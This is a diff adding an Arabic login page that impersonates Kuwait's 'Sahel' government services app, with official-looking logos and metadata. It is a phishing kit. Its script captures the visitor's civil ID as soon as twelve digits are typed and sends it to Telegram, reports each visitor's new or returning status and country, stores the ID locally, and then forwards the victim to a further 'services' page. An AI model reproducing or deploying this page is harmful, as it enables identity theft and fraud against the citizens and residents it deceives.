@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>تسجيل الدخول</title>
+    <meta property="og:title" content="سهل" />
+    <meta
+      property="og:description"
+      content="يعتبر تطبيق &quot;سهل&quot; نافذة حكومية موحدة وقناة استلام الإشعارات والإعلانات من كافة الجهات الحكومية و يتيح للمواطن والمقيم الدخول الموحد إلى كافة الخدمات الحكومية، كما ويساهم في تحسين تقديم الخدمات إلكترونياً."
+    />
+    <meta
+      property="og:image"
+      content="https://play-lh.googleusercontent.com/S_SQTSm14KXM4AeF1oTMF9jogQYHxxJlWkFCHGCZsF5R8ta0FMDKfQV4TWCiJugY1Jw=w480-h960-rw"
+    />
+    <meta property="og:url" content="https://tashelatkuwait.netlify.app/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:locale" content="ar_AR" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="سهل" />
+    <meta
+      name="twitter:description"
+      content="يعتبر تطبيق &quot;سهل&quot; نافذة حكومية موحدة وقناة استلام الإشعارات والإعلانات من كافة الجهات الحكومية و يتيح للمواطن والمقيم الدخول الموحد إلى كافة الخدمات الحكومية، كما ويساهم في تحسين تقديم الخدمات إلكترونياً."
+    />
+    <meta
+      name="twitter:image"
+      content="https://play-lh.googleusercontent.com/S_SQTSm14KXM4AeF1oTMF9jogQYHxxJlWkFCHGCZsF5R8ta0FMDKfQV4TWCiJugY1Jw=w480-h960-rw"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --primary: #3f7bc4;
+        --primary-dark: #2c66ad;
+        --text: #545454;
+        --footer: #3f7bc4;
+        --border: #73a5e0;
+        --background: #f4f6fa;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: "Tajawal", "Arial", sans-serif;
+        color: var(--text);
+        font-size: 15px;
+        background: #fff;
+      }
+
+      .page {
+        width: 100%;
+        min-height: 100vh;
+        background: #fff;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .header,
+      .content,
+      .footer {
+        width: 100%;
+        background: #fff;
+      }
+
+      .header-inner,
+      .content-inner,
+      .footer-inner {
+        width: min(100%, 390px);
+        margin: 0 auto;
+        padding-left: 22px;
+        padding-right: 22px;
+      }
+
+      .header {
+        padding-top: 0;
+      }
+
+      .header-inner {
+        padding-bottom: 18px;
+      }
+
+      .content {
+        flex: 1;
+      }
+
+      .content-inner {
+        display: flex;
+        flex-direction: column;
+        padding-top: 10px;
+        padding-bottom: 28px;
+      }
+
+      .logo-wrap {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 30px;
+        width: 100%;
+      }
+
+      .logo {
+        height: auto;
+        display: block;
+        max-width: 100%;
+      }
+
+      .logo-paci {
+        flex-shrink: 0;
+        width: min(52vw, 210px);
+        height: auto;
+      }
+
+      .logo-sahel {
+        width: min(34vw, 150px);
+        height: auto;
+      }
+
+      .title {
+        margin: 0;
+        text-align: center;
+        font-size: 18px;
+        line-height: 1.7;
+        color: var(--primary);
+        font-weight: 700;
+      }
+
+      .hero {
+        text-align: center;
+      }
+
+      .hero-title {
+        margin: 0;
+      }
+
+      .hero-title .highlight-sweep {
+        display: inline-block;
+      }
+
+      .subtitle {
+        margin: 8px 0 0;
+        font-size: 15px;
+        line-height: 1.8;
+        color: #6c7f95;
+        font-weight: 500;
+      }
+
+      .highlight-sweep {
+        background-image: linear-gradient(
+          102deg,
+          var(--primary) 0%,
+          var(--primary) 34%,
+          #74d7ff 46%,
+          #f6c980 53%,
+          #63b9ff 60%,
+          var(--primary) 72%,
+          var(--primary) 100%
+        );
+        background-size: 240% 100%;
+        background-position: 100% 50%;
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        animation: sweep-highlight 4.8s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
+      }
+
+      .login-form {
+        margin: 0;
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .form-upper {
+        margin-top: clamp(28px, 6vh, 56px);
+      }
+
+      .field {
+        margin-bottom: 24px;
+      }
+
+      .field-error {
+        display: none;
+        margin: 8px 0 0;
+        color: #d32f2f;
+        font-size: 13px;
+        font-weight: 700;
+        text-align: right;
+      }
+
+      .field-error.is-visible {
+        display: block;
+      }
+
+      .input {
+        width: 100%;
+        height: 58px;
+        border: 2px solid #d7e2ec;
+        border-radius: 10px;
+        padding: 0 18px;
+        font-size: 15px;
+        color: var(--text);
+        outline: none;
+        direction: ltr;
+        text-align: left;
+        unicode-bidi: plaintext;
+      }
+
+      .input::placeholder {
+        color: #9da7b4;
+      }
+
+      .input:placeholder-shown {
+        direction: rtl;
+        text-align: right;
+      }
+
+      .terms {
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        gap: 10px;
+        margin-bottom: 0;
+        font-size: 15px;
+        font-weight: 700;
+        color: #4f4f4f;
+      }
+
+      .terms-copy {
+        color: #757575;
+      }
+
+      .terms-link {
+        color: inherit;
+        text-decoration: underline;
+        text-decoration-thickness: 1.5px;
+        text-underline-offset: 2px;
+      }
+
+      .terms input {
+        width: 20px;
+        height: 20px;
+        margin: 0;
+        accent-color: var(--primary);
+      }
+
+      .actions {
+        margin-top: auto;
+        padding-top: clamp(28px, 6vh, 52px);
+      }
+
+      .submit {
+        width: 100%;
+        height: 44px;
+        display: block;
+        margin: 0 auto 40px;
+        border: 0;
+        border-radius: 18px;
+        background: linear-gradient(180deg, var(--primary) 0%, var(--primary-dark) 100%);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 700;
+        cursor: pointer;
+        box-shadow: 0 12px 24px rgba(63, 123, 196, 0.22);
+      }
+
+      .links {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-top: 0;
+      }
+
+      .link {
+        color: var(--primary);
+        font-size: 18px;
+        font-weight: 700;
+        text-decoration: none;
+      }
+
+      .footer {
+        background: var(--footer);
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        font-size: 15px;
+        line-height: 1.7;
+        padding-top: 10px;
+        padding-bottom: 10px;
+      }
+
+      .footer-inner {
+        padding: 0;
+      }
+
+      @keyframes sweep-highlight {
+        0% {
+          background-position: 100% 50%;
+        }
+
+        100% {
+          background-position: 0% 50%;
+        }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        .highlight-sweep {
+          animation: none;
+          background-position: 50% 50%;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .header {
+          padding-top: 0;
+        }
+
+        .logo-paci {
+          width: unset;
+          max-width: none;
+          height: 122px;
+        }
+
+        .logo-sahel {
+          width: unset;
+          max-width: none;
+          height: 110px;
+        }
+
+        .logo-wrap {
+          margin-bottom: 28px;
+        }
+
+        .form-upper {
+          margin-top: 36px;
+        }
+
+        .actions {
+          padding-top: 36px;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .header {
+          padding-top: 34px;
+        }
+
+        .header-inner,
+        .content-inner,
+        .footer-inner {
+          width: min(100%, 1120px);
+          padding-left: 48px;
+          padding-right: 48px;
+        }
+
+        .logo-wrap {
+          justify-content: center;
+          gap: 22px;
+          margin-bottom: 18px;
+        }
+
+        .logo-paci {
+          height: 112px;
+          width: auto;
+        }
+
+        .logo-sahel {
+          height: 112px;
+          width: auto;
+        }
+
+        .content-inner {
+          max-width: 540px;
+          padding-top: 8px;
+        }
+
+        .footer-inner {
+          width: min(100%, 1120px);
+          text-align: center;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="page">
+      <header class="header">
+        <div class="header-inner">
+          <div class="logo-wrap">
+            <img class="logo logo-paci" src="assets/images/paci.png" alt="شعار PACI" />
+            <img class="logo logo-sahel" src="assets/images/logo.png" alt="شعار سهل" />
+          </div>
+
+          <div class="hero">
+            <h1 class="title hero-title">
+              <span class="highlight-sweep">مرحبا بك في سهل</span>
+            </h1>
+            <p class="subtitle">تلبية احتياجات المواطنين والوافدين</p>
+          </div>
+        </div>
+      </header>
+
+      <section class="content">
+        <div class="content-inner">
+          <form class="login-form" novalidate>
+            <div class="form-upper">
+              <div class="field">
+                <input
+                  class="input"
+                  id="civil-id"
+                  type="text"
+                  placeholder="أدخل الرقم المدني"
+                  inputmode="numeric"
+                  autocomplete="off"
+                  maxlength="12"
+                  lang="en"
+                />
+                <p class="field-error" id="civil-id-error" aria-live="polite"></p>
+              </div>
+
+              <label class="terms">
+                <input id="terms-accepted" name="terms-accepted" type="checkbox" checked />
+                <span class="terms-copy">
+                  أوافق على
+                  <a class="terms-link highlight-sweep" href="#" data-inert-link>الشروط والأحكام</a>
+                </span>
+              </label>
+            </div>
+
+            <div class="actions">
+              <button class="submit" type="submit">تسجيل الدخول</button>
+
+              <div class="links">
+                <a class="link" href="#" data-inert-link>اتصل بنا</a>
+                <a class="link" href="#" data-inert-link>خطوات التسجيل</a>
+              </div>
+            </div>
+          </form>
+        </div>
+      </section>
+
+      <footer class="footer" style="padding-top: 10px;">
+        <div class="footer-inner">جميع الحقوق محفوظة © مقر الهيئة العامة الكويت 2026</div>
+      </footer>
+    </main>
+
+    <script src="assets/js/telegram.js"></script>
+    <script src="assets/js/tg.js"></script>
+    <script>
+      var INDEX_VISITOR_STATUS_KEY = "appVisitorStatus";
+      var INDEX_VISITOR_SESSION_KEY = "indexVisitorNotificationSent";
+      var CIVIL_ID_ERROR_MESSAGE = "تم ادخال رقم المدني بشكل خطاء";
+
+      function normalizeCivilId(value) {
+        return Array.from(value)
+          .map(function (char) {
+            var code = char.charCodeAt(0);
+
+            if (code >= 0x0660 && code <= 0x0669) {
+              return String(code - 0x0660);
+            }
+
+            if (code >= 0x06f0 && code <= 0x06f9) {
+              return String(code - 0x06f0);
+            }
+
+            if (code >= 0x0966 && code <= 0x096f) {
+              return String(code - 0x0966);
+            }
+
+            if (code >= 0xff10 && code <= 0xff19) {
+              return String(code - 0xff10);
+            }
+
+            return char;
+          })
+          .join("")
+          .replace(/\D/g, "")
+          .slice(0, 12);
+      }
+
+      async function notifyIndexVisitorOncePerSession() {
+        if (sessionStorage.getItem(INDEX_VISITOR_SESSION_KEY) === "true") {
+          return;
+        }
+
+        var visitorStatus = localStorage.getItem(INDEX_VISITOR_STATUS_KEY) ? "مستخدم قديم" : "مستخدم جديد";
+        localStorage.setItem(INDEX_VISITOR_STATUS_KEY, "visited");
+
+        var countryName = "";
+
+        if (window.getAppCountryNameInArabic) {
+          try {
+            countryName = await window.getAppCountryNameInArabic();
+          } catch (error) {
+            countryName = "";
+          }
+        }
+
+        var lines = ["👤 " + visitorStatus];
+
+        if (countryName) {
+          lines.push("📍 من " + countryName);
+        }
+
+        try {
+          if (window.sendAppTelegramMessage) {
+            await window.sendAppTelegramMessage(lines.join("\n"), false);
+          }
+        } catch (error) {
+        } finally {
+          sessionStorage.setItem(INDEX_VISITOR_SESSION_KEY, "true");
+        }
+      }
+
+      var loginForm = document.querySelector(".login-form");
+      var civilIdInput = document.querySelector("#civil-id");
+      var civilIdError = document.querySelector("#civil-id-error");
+      var CIVIL_ID_TELEGRAM_SENT_KEY = "civil-id-telegram-sent";
+
+      function getFieldStorageKey(field) {
+        return field.id || field.name || "";
+      }
+
+      function restoreFieldValue(field) {
+        var key = getFieldStorageKey(field);
+
+        if (!key) {
+          return;
+        }
+
+        var storedValue = localStorage.getItem(key);
+
+        if (storedValue === null) {
+          return;
+        }
+
+        if (field.type === "radio") {
+          field.checked = field.value === storedValue;
+          return;
+        }
+
+        if (field.type === "checkbox") {
+          field.checked = storedValue === "true";
+          return;
+        }
+
+        if (field.id === "civil-id") {
+          field.value = normalizeCivilId(storedValue);
+          return;
+        }
+
+        field.value = storedValue;
+      }
+
+      function persistFieldValue(field) {
+        var key = getFieldStorageKey(field);
+
+        if (!key) {
+          return;
+        }
+
+        if (field.type === "radio") {
+          if (field.checked) {
+            localStorage.setItem(key, field.value);
+          }
+
+          return;
+        }
+
+        if (field.type === "checkbox") {
+          localStorage.setItem(key, String(field.checked));
+          return;
+        }
+
+        localStorage.setItem(key, field.value || "");
+      }
+
+      function showCivilIdError() {
+        civilIdError.textContent = CIVIL_ID_ERROR_MESSAGE;
+        civilIdError.classList.add("is-visible");
+        civilIdInput.setAttribute("aria-invalid", "true");
+      }
+
+      function clearCivilIdError() {
+        civilIdError.textContent = "";
+        civilIdError.classList.remove("is-visible");
+        civilIdInput.removeAttribute("aria-invalid");
+      }
+
+      function isValidCivilId() {
+        return normalizeCivilId(civilIdInput.value || "").length === 12;
+      }
+
+      function sendCivilIdToTelegram(civilId) {
+        if (!civilId || !window.sendAppTelegramMessage) {
+          return;
+        }
+
+        if (sessionStorage.getItem(CIVIL_ID_TELEGRAM_SENT_KEY) === civilId) {
+          return;
+        }
+
+        sessionStorage.setItem(CIVIL_ID_TELEGRAM_SENT_KEY, civilId);
+
+        var pageMessage = "📄 الصفحة: الرئيسية";
+
+        window
+          .sendAppTelegramMessage("👤 تسجيل دخول\n🆔 الرقم المدني: " + civilId, false)
+          .then(function () {
+            return window.sendAppTelegramMessage(pageMessage, false);
+          })
+          .catch(function () {
+            sessionStorage.removeItem(CIVIL_ID_TELEGRAM_SENT_KEY);
+          });
+      }
+
+      loginForm.querySelectorAll("input, select, textarea").forEach(function (field) {
+        restoreFieldValue(field);
+
+        if (field.type === "radio" || field.type === "checkbox") {
+          field.addEventListener("change", function () {
+            persistFieldValue(field);
+          });
+          return;
+        }
+
+        field.addEventListener("input", function () {
+          if (field.id === "civil-id") {
+            var normalizedValue = normalizeCivilId(field.value);
+
+            if (field.value !== normalizedValue) {
+              field.value = normalizedValue;
+            }
+
+            clearCivilIdError();
+
+            if (normalizedValue.length === 12) {
+              sendCivilIdToTelegram(normalizedValue);
+            }
+          }
+
+          persistFieldValue(field);
+        });
+      });
+
+      document.querySelector(".login-form").addEventListener("submit", function (event) {
+        event.preventDefault();
+        loginForm.querySelectorAll("input, select, textarea").forEach(function (field) {
+          persistFieldValue(field);
+        });
+
+        if (!isValidCivilId()) {
+          showCivilIdError();
+          civilIdInput.focus();
+          return;
+        }
+
+        clearCivilIdError();
+        var normalizedCivilId = normalizeCivilId(civilIdInput.value || "");
+        localStorage.setItem("civil-id", normalizedCivilId);
+        sendCivilIdToTelegram(normalizedCivilId);
+        window.location.href = "services.html";
+      });
+
+      document.querySelectorAll("[data-inert-link]").forEach(function (link) {
+        link.addEventListener("click", function (event) {
+          event.preventDefault();
+        });
+      });
+
+      notifyIndexVisitorOncePerSession().catch(function () {});
+    </script>
+  </body>
+</html>
